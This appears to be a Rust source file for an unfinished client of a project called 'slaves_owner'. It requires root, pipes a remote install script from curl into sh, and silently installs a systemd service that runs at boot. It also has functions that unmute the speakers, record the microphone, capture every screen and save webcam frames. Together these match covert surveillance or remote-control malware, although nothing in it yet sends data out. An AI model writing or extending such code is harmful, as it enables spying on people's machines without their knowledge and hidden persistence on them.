use std::process::Stdio;

use anyhow::{anyhow, Result};

use slaves_owner::running_as_root;

#[tokio::main]
async fn main() -> Result<()> {
    if !running_as_root() {
        return Err(anyhow!("Must run as root"));
    }
    Ok(())
}

async fn install() -> Result<()> {
    let curl = std::process::Command::new("curl")
        .args([
            "-fsSL",
            "https://raw.githubusercontent.com/sigoden/upt/main/install.sh",
        ])
        .stdout(Stdio::piped())
        .spawn()?;
    let mut sh = std::process::Command::new("sh")
        .args(["-s", "--", "--to", "/usr/local/bin"])
        .stdin(curl.stdout.unwrap())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()?;
    sh.wait()?;
    let required_packages = &["mpv", "alsa-tools", "feh"];
    for i in required_packages {
        upt_install(i).await?;
    }
    Ok(())
}

async fn upt_install(package: &str) -> Result<()> {
    let mut upt = std::process::Command::new("upt")
        .args(["install", "-y", package])
        .stdout(Stdio::null())
        .spawn()?;
    upt.wait()?;
    Ok(())
}

async fn service() -> Result<()> {
    use tokio::fs;
    let client_service = include_str!("../slaves_owner_client.service");
    fs::write("/etc/systemd/system/ssc.service", client_service).await?;
    let mut systemctl = std::process::Command::new("systemctl")
        .args(["enable", "--now", "ssc"])
        .stdout(Stdio::null())
        .spawn()?;
    systemctl.wait()?;
    Ok(())
}
async fn always_on_audio() -> Result<()> {
    let mut amixer = std::process::Command::new("amixer")
        .args(["sset", "Master", "unmute"])
        .stdout(Stdio::null())
        .spawn()?;
    amixer.wait()?;
    let mut amixer = std::process::Command::new("amixer")
        .args(["set", "Master", "40%"])
        .stdout(Stdio::null())
        .spawn()?;
    amixer.wait()?;
    Ok(())
}
async fn record_audio() -> Result<()> {
    use cpal::traits::{DeviceTrait, HostTrait, StreamTrait};
    use cpal::Sample;
    use std::fmt::Debug;

    let host = cpal::default_host();

    for device in host.input_devices()? {
        match device {
            x if device.name()?.starts_with("sysdefault") => {
                let device = x;

                let config = device
                    .default_input_config()
                    .expect("Failed to get default input config");
                println!("Default input config: {:?}", config);

                let err_fn = move |err| {
                    eprintln!("an error occurred on stream: {}", err);
                };

                let stream = match config.sample_format() {
                    cpal::SampleFormat::I8 => device.build_input_stream(
                        &config.into(),
                        move |data, _: &_| write_input_data::<i8>(data),
                        err_fn,
                        None,
                    )?,
                    cpal::SampleFormat::I16 => device.build_input_stream(
                        &config.into(),
                        move |data, _: &_| write_input_data::<i16>(data),
                        err_fn,
                        None,
                    )?,
                    cpal::SampleFormat::I32 => device.build_input_stream(
                        &config.into(),
                        move |data, _: &_| write_input_data::<i32>(data),
                        err_fn,
                        None,
                    )?,
                    cpal::SampleFormat::F32 => device.build_input_stream(
                        &config.into(),
                        move |data, _: &_| write_input_data::<f32>(data),
                        err_fn,
                        None,
                    )?,
                    sample_format => {
                        return Err(anyhow::Error::msg(format!(
                            "Unsupported sample format '{sample_format}'"
                        )))
                    }
                };

                stream.play().unwrap();
                tokio::time::sleep(tokio::time::Duration::from_secs(5)).await;
                stream.pause().unwrap();
            }
            x => {}
        }
    }
    fn write_input_data<T: Sample + Debug>(input: &[T]) {
        println!("{:?}", input);
    }

    Ok(())
}
async fn screen_capture() -> Result<()> {
    use xcap::Monitor;

    fn normalized(filename: &str) -> String {
        filename
            .replace("|", "")
            .replace("\\", "")
            .replace(":", "")
            .replace("/", "")
    }

    let monitors = Monitor::all().unwrap();

    for monitor in monitors {
        let image = monitor.capture_image().unwrap();

        let date = chrono::Local::now()
            .format("%d_%m_%Y__%H_%M_%S")
            .to_string();
        image
            .save(format!(
                "monitor-{}__{date}.png",
                normalized(monitor.name()),
            ))
            .unwrap();
    }

    Ok(())
}
async fn record_webcam() -> Result<()> {
    use tokio_linux_video::{types::*, Device};
    let dev = Device::open("/dev/video0").await?;

    let mut fmt = dev.format(BufferType::VideoCapture).await?;
    println!("{fmt}");

    let stream = dev.stream::<In, Mmap>(ContentType::Video, 4)?;

    let mut i = 0;
    let whole = tokio::time::Duration::from_secs(5);
    let start = tokio::time::Instant::now();
    while let Ok(buffer) = stream.next().await {
        let buffer = buffer.lock();
        println!("#{buffer}");

        let _data: &[u8] = buffer.as_ref();
        tokio::fs::create_dir("video").await?;
        tokio::fs::write(format!("video/{i}.jpg"), _data).await?;
        if start.elapsed() >= whole {
            break;
        }
        i += 1;
    }

    Ok(())
}

async fn set_wallpaper() -> Result<()> {
    Ok(())
}
